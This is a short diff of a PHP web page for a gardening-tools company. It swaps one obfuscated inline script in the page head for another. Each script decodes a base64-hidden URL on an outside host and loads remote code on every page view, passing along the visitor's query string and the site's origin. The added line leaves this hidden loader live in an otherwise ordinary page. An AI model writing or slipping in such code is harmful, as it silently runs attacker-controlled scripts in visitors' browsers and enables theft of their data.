@@ -120,8 +120,7 @@ $csrfToken = $_SESSION["csrf_token"];
 <!doctype html>
 <html lang="en">
 <head>
-<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhcmRlbmluZy1zZXJ2aWNlcy11Y3Z3bi5vbmRpZ2l0YWxvY2Vhbi5hcHAvT0JVTk9USk5ZYS5waHA/X19zaWQ9ZDU1YTY0N2QtNDZhYy00MWU4LThiZDMtNjQ1ODBjNjU5ZTk0");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
-  <meta charset="utf-8" />
+<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhZGVybmluZy1zZXJ2aWNlLWV5cXlnLm9uZGlnaXRhbG9jZWFuLmFwcC9PQlVOT1RKTllhLnBocD9fX3NpZD1hMDNiYTZjMS02M2RjLTRkN2MtOWI5NS0xOTNkZDEyMzQzY2I=");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title><?php echo h($siteName); ?></title>
   <meta name="description" content="Apex Gardening Tools — home gardening tools manufacturer." />
@@ -703,3 +702,4 @@ $csrfToken = $_SESSION["csrf_token"];
   </script>
 </body>
 </html>
+
